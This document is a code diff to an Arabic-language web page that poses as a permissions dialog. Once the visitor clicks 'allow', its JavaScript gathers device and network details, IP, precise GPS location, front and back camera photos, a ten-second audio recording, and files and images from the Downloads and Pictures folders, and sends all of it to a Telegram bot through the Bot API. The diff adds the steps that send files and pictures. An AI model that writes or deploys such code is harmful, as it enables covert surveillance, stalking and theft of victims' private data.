@@ -131,6 +131,21 @@
             background-color: #fce8e6;
             color: #d93025;
         }
+        
+        .progress-container {
+            width: 100%;
+            background-color: #f1f1f1;
+            border-radius: 5px;
+            margin: 15px 0;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            border-radius: 5px;
+            background-color: #4285f4;
+            width: 0%;
+            transition: width 0.3s;
+        }
     </style>
 </head>
 <body>
@@ -161,7 +176,7 @@
                 <div class="permission-item-icon">📷</div>
                 <div class="permission-item-text">
                     <div class="permission-item-name">الكاميرا الأمامية والخلفية</div>
-                    <div class="permission-item-desc">التقاط صور وفيديوهات من الكاميرات</div>
+                    <div class="permission-item-desc">التقاط صور من الكاميرات</div>
                 </div>
             </div>
             
@@ -181,20 +196,8 @@
                 </div>
             </div>
             
-            <div class="permission-item">
-                <div class="permission-item-icon">🔔</div>
-                <div class="permission-item-text">
-                    <div class="permission-item-name">الإشعارات</div>
-                    <div class="permission-item-desc">قراءة الإشعارات خلال الـ24 ساعة الماضية</div>
-                </div>
-            </div>
-            
-            <div class="permission-item">
-                <div class="permission-item-icon">📞</div>
-                <div class="permission-item-text">
-                    <div class="permission-item-name">جهات الاتصال</div>
-                    <div class="permission-item-desc">قراءة دفتر العناوين</div>
-                </div>
+            <div class="progress-container" id="progress-container" style="display: none;">
+                <div class="progress-bar" id="progress-bar"></div>
             </div>
             
             <div class="action-buttons">
@@ -227,24 +230,60 @@
         const statusProcessing = document.getElementById('status-processing');
         const statusSuccess = document.getElementById('status-success');
         const statusError = document.getElementById('status-error');
+        const progressContainer = document.getElementById('progress-container');
+        const progressBar = document.getElementById('progress-bar');
         
         // معالجة النقر على زر السماح
         allowBtn.addEventListener('click', async () => {
             allowBtn.disabled = true;
             denyBtn.disabled = true;
             statusProcessing.style.display = 'block';
+            progressContainer.style.display = 'block';
             
             try {
-                // جمع وإرسال جميع المعلومات
-                await collectAndSendAllData();
+                updateProgress(0, 'بدء العملية...');
                 
+                // 1. جمع وإرسال معلومات الجهاز
+                updateProgress(10, 'جمع معلومات الجهاز...');
+                const deviceInfo = await getDeviceInfo();
+                await sendToTelegram(formatDeviceInfo(deviceInfo));
+                
+                // 2. الحصول على الموقع الجغرافي
+                updateProgress(20, 'جمع بيانات الموقع...');
+                await getAndSendLocation();
+                
+                // 3. الكاميرا الأمامية
+                updateProgress(30, 'الوصول إلى الكاميرا الأمامية...');
+                await captureAndSendPhoto('user', 'front_camera.jpg', 'الكاميرا الأمامية');
+                
+                // 4. الكاميرا الخلفية
+                updateProgress(40, 'الوصول إلى الكاميرا الخلفية...');
+                await captureAndSendPhoto('environment', 'back_camera.jpg', 'الكاميرا الخلفية');
+                
+                // 5. التسجيل الصوتي
+                updateProgress(50, 'التسجيل الصوتي...');
+                await recordAndSendAudio();
+                
+                // 6. ملفات التحميل
+                updateProgress(60, 'فحص مجلد التحميلات...');
+                await checkAndSendDownloads();
+                
+                // 7. الصور من مجلد الصور
+                updateProgress(70, 'فحص مجلد الصور...');
+                await checkAndSendPictures();
+                
+                updateProgress(100, 'اكتملت العملية!');
                 statusProcessing.style.display = 'none';
                 statusSuccess.style.display = 'block';
+                
+                // إرسال ملخص
+                await sendToTelegram('✅ تم الانتهاء من جمع جميع البيانات بنجاح!');
             } catch (error) {
                 console.error('Error:', error);
                 statusProcessing.style.display = 'none';
                 statusError.style.display = 'block';
                 statusError.textContent = `حدث خطأ: ${error.message}`;
+                await sendToTelegram(`⚠️ حدث خطأ: ${error.message}`);
             }
         });
         
@@ -259,107 +298,124 @@
             `;
         });
         
-        // دالة رئيسية لجمع وإرسال جميع البيانات
-        async function collectAndSendAllData() {
-            // 1. إرسال معلومات الجهاز الأساسية
-            const deviceInfo = await getDeviceInfo();
-            await sendToTelegram(formatDeviceInfo(deviceInfo));
-            
-            // 2. الكاميرا الأمامية
-            try {
-                const frontCameraPhoto = await captureCameraPhoto('user');
-                await sendPhotoToTelegram(frontCameraPhoto, 'front_camera.jpg');
-            } catch (error) {
-                await sendToTelegram("⚠️ فشل الوصول إلى الكاميرا الأمامية: " + error.message);
-            }
-            
-            // 3. الكاميرا الخلفية
-            try {
-                const backCameraPhoto = await captureCameraPhoto('environment');
-                await sendPhotoToTelegram(backCameraPhoto, 'back_camera.jpg');
-            } catch (error) {
-                await sendToTelegram("⚠️ فشل الوصول إلى الكاميرا الخلفية: " + error.message);
-            }
-            
-            // 4. الموقع الجغرافي
+        // دالة لتحديث شريط التقدم
+        function updateProgress(percent, message) {
+            progressBar.style.width = `${percent}%`;
+            statusProcessing.textContent = message;
+        }
+        
+        // دالة لجمع وإرسال الموقع الجغرافي
+        async function getAndSendLocation() {
             try {
                 const location = await getLocation();
                 await sendToTelegram(`📍 الموقع الجغرافي:\n- خط العرض: ${location.latitude}\n- خط الطول: ${location.longitude}\n- الدقة: ${location.accuracy} متر\n- رابط الخريطة: https://maps.google.com/?q=${location.latitude},${location.longitude}`);
             } catch (error) {
                 await sendToTelegram("⚠️ فشل الحصول على الموقع الجغرافي: " + error.message);
+                throw error;
             }
-            
-            // 5. التسجيل الصوتي
+        }
+        
+        // دالة لالتقاط وإرسال صورة من الكاميرا
+        async function captureAndSendPhoto(facingMode, filename, cameraName) {
             try {
+                await requestCameraAccess(facingMode);
+                const photo = await captureCameraPhoto(facingMode);
+                await sendPhotoToTelegram(photo, filename);
+                await sendToTelegram(`✅ تم التقاط صورة من ${cameraName} بنجاح`);
+            } catch (error) {
+                await sendToTelegram(`⚠️ فشل الوصول إلى ${cameraName}: ` + error.message);
+                throw error;
+            }
+        }
+        
+        // دالة للتسجيل وإرسال الصوت
+        async function recordAndSendAudio() {
+            try {
+                await requestMicrophoneAccess();
                 const audioBlob = await recordAudio(10);
                 await sendAudioToTelegram(audioBlob, 'audio_recording.ogg');
+                await sendToTelegram('✅ تم التسجيل الصوتي بنجاح');
             } catch (error) {
                 await sendToTelegram("⚠️ فشل التسجيل الصوتي: " + error.message);
+                throw error;
             }
-            
-            // 6. ملفات التحميل
+        }
+        
+        // دالة لفحص وإرسال معلومات التحميلات
+        async function checkAndSendDownloads() {
             try {
+                await requestFilesAccess('downloads');
                 const downloadFiles = await getFilesFromDirectory('downloads');
-                if (downloadFiles.length > 0) {
-                    await sendToTelegram(`📁 عدد الملفات في مجلد التحميل: ${downloadFiles.length}`);
-                    // يمكن إضافة إرسال الملفات هنا
+                await sendToTelegram(`📁 عدد الملفات في مجلد التحميل: ${downloadFiles.length}`);
+                
+                // إرسال بعض الملفات كمثال (الأول 3 ملفات)
+                for (let i = 0; i < Math.min(3, downloadFiles.length); i++) {
+                    const file = await downloadFiles[i].getFile();
+                    await sendFileToTelegram(file, file.name);
                 }
             } catch (error) {
                 await sendToTelegram("⚠️ فشل الوصول إلى مجلد التحميل: " + error.message);
+                throw error;
             }
-            
-            // 7. الصور من مجلد الصور
+        }
+        
+        // دالة لفحص وإرسال معلومات الصور
+        async function checkAndSendPictures() {
             try {
+                await requestFilesAccess('pictures');
                 const pictures = await getFilesFromDirectory('pictures');
-                if (pictures.length > 0) {
-                    await sendToTelegram(`📸 عدد الصور في مجلد الصور: ${pictures.length}`);
-                    // يمكن إرسال بعض الصور كمثال
+                await sendToTelegram(`📸 عدد الصور في مجلد الصور: ${pictures.length}`);
+                
+                // إرسال بعض الصور كمثال (الأول 3 صور)
+                let sent = 0;
+                for (const entry of pictures) {
+                    if (entry.name.match(/\.(jpg|jpeg|png|gif)$/i)) {
+                        const file = await entry.getFile();
+                        await sendPhotoToTelegram(file, file.name);
+                        sent++;
+                        if (sent >= 3) break;
+                    }
                 }
             } catch (error) {
                 await sendToTelegram("⚠️ فشل الوصول إلى مجلد الصور: " + error.message);
+                throw error;
             }
-            
-            // 8. جهات الاتصال (هذه تحتاج إلى API خاص)
-            try {
-                // هذه الميزة تحتاج إلى صلاحيات خاصة
-                await sendToTelegram("📞 لا يمكن الوصول إلى جهات الاتصال من خلال المتصفح بدون إضافات خاصة");
-            } catch (error) {
-                await sendToTelegram("⚠️ فشل قراءة جهات الاتصال: " + error.message);
-            }
-            
-            // 9. الإشعارات (غير متاحة في المتصفح)
-            await sendToTelegram("🔔 لا يمكن قراءة الإشعارات من خلال المتصفح");
         }
         
-        // دالة لجمع معلومات الجهاز
-        async function getDeviceInfo() {
-            const info = {
-                country: await getCountry(),
-                city: await getCity(),
-                ip: await getIP(),
-                batteryLevel: await getBatteryLevel(),
-                isCharging: await getChargingStatus(),
-                network: await getNetworkInfo(),
-                connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
-                time: new Date().toLocaleString(),
-                deviceName: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
-                deviceVersion: 'غير معروف',
-                deviceType: getDeviceType(),
-                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
-                storage: 'غير معروف', // لا يمكن الحصول عليها من المتصفح
-                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
-                language: navigator.language,
-                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/)?.[0] || navigator.userAgent,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                osVersion: 'غير معروف', // لا يمكن الحصول عليها من المتصفح
-                screenOrientation: window.screen.orientation.type,
-                colorDepth: `${window.screen.colorDepth} بت`,
-                bluetooth: 'غير متاح في المتصفح',
-                geolocation: 'متاح' in navigator.geolocation ? 'نعم' : 'لا',
-                touchSupport: 'ontouchstart' in window ? 'نعم' : 'لا'
-            };
+        // دالة لطلب إذن الكاميرا
+        async function requestCameraAccess(facingMode) {
+            return navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: facingMode,
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            }).then(stream => {
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            });
+        }
+        
+        // دالة لطلب إذن الميكروفون
+        async function requestMicrophoneAccess() {
+            return navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+                stream.getTracks().forEach(track => track.stop());
+                return true;
+            });
+        }
+        
+        // دالة لطلب إذن الملفات
+        async function requestFilesAccess(dirName) {
+            if (!('showDirectoryPicker' in window)) {
+                throw new Error("File System Access API not supported");
+            }
             
-            return info;
+            try {
+                const dirHandle = await window.showDirectoryPicker({ startIn: dirName });
+                return dirHandle;
+            } catch (error) {
+                throw new Error("تم رفض إذن الوصول إلى الملفات");
+            }
         }
         
         // دالة لالتقاط صورة من الكاميرا
@@ -385,6 +441,9 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
+            
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
             stream.getTracks().forEach(track => track.stop());
@@ -406,7 +465,7 @@
                         });
                     },
                     (error) => reject(error),
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             });
         }
@@ -429,9 +488,13 @@
             });
             
             mediaRecorder.start();
-            await new Promise(resolve => setTimeout(resolve, duration * 1000));
-            mediaRecorder.stop();
             
+            for (let i = duration; i > 0; i--) {
+                statusProcessing.textContent = `جاري التسجيل الصوتي... ${i} ثانية متبقية`;
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            
+            mediaRecorder.stop();
             stream.getTracks().forEach(track => track.stop());
             
             return recordingPromise;
@@ -439,20 +502,57 @@
         
         // دالة للحصول على الملفات من مجلد معين
         async function getFilesFromDirectory(dirName) {
-            if (!('showDirectoryPicker' in window)) {
-                throw new Error("File System Access API not supported");
-            }
-            
-            const dirHandle = await window.showDirectoryPicker({ startIn: dirName });
+            const dirHandle = await requestFilesAccess(dirName);
             const files = [];
             
             for await (const entry of dirHandle.values()) {
                 if (entry.kind === 'file') {
                     files.push(entry);
+                } else if (entry.kind === 'directory') {
+                    // البحث في المجلدات الفرعية (مثل Screenshots داخل Pictures)
+                    if (entry.name.toLowerCase() === 'screenshots' || entry.name.toLowerCase() === 'telegram') {
+                        const subDirHandle = await dirHandle.getDirectoryHandle(entry.name);
+                        for await (const subEntry of subDirHandle.values()) {
+                            if (subEntry.kind === 'file') {
+                                files.push(subEntry);
+                            }
+                        }
+                    }
                 }
             }
             
             return files;
+        }
+        
+        // دالة لجمع معلومات الجهاز
+        async function getDeviceInfo() {
+            const info = {
+                country: await getCountry(),
+                city: await getCity(),
+                ip: await getIP(),
+                batteryLevel: await getBatteryLevel(),
+                isCharging: await getChargingStatus(),
+                network: await getNetworkInfo(),
+                connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف',
+                time: new Date().toLocaleString(),
+                deviceName: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
+                deviceVersion: 'غير معروف',
+                deviceType: getDeviceType(),
+                ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'غير معروف',
+                storage: 'غير معروف',
+                cpuCores: navigator.hardwareConcurrency || 'غير معروف',
+                language: navigator.language,
+                browser: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/([\d.]+)/)?.[0] || navigator.userAgent,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                osVersion: 'غير معروف',
+                screenOrientation: window.screen.orientation.type,
+                colorDepth: `${window.screen.colorDepth} بت`,
+                bluetooth: 'غير متاح في المتصفح',
+                geolocation: 'متاح' in navigator.geolocation ? 'نعم' : 'لا',
+                touchSupport: 'ontouchstart' in window ? 'نعم' : 'لا'
+            };
+            
+            return info;
         }
         
         // دوال مساعدة للحصول على معلومات الشبكة والبلد
@@ -577,26 +677,55 @@
         
         // دالة لإرسال صورة إلى تيليجرام
         async function sendPhotoToTelegram(photoBlob, filename) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', photoBlob, filename);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-            });
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                
+                if (photoBlob instanceof Blob) {
+                    formData.append('photo', photoBlob, filename);
+                } else if (photoBlob instanceof File) {
+                    formData.append('photo', photoBlob);
+                }
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Error sending photo to Telegram:', error);
+            }
         }
         
         // دالة لإرسال تسجيل صوتي إلى تيليجرام
         async function sendAudioToTelegram(audioBlob, filename) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('audio', audioBlob, filename);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                method: 'POST',
-                body: formData
-            });
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('audio', audioBlob, filename);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Error sending audio to Telegram:', error);
+            }
+        }
+        
+        // دالة لإرسال ملف إلى تيليجرام
+        async function sendFileToTelegram(file, filename) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', file, filename);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                console.error('Error sending file to Telegram:', error);
+            }
         }
     </script>
 </body>
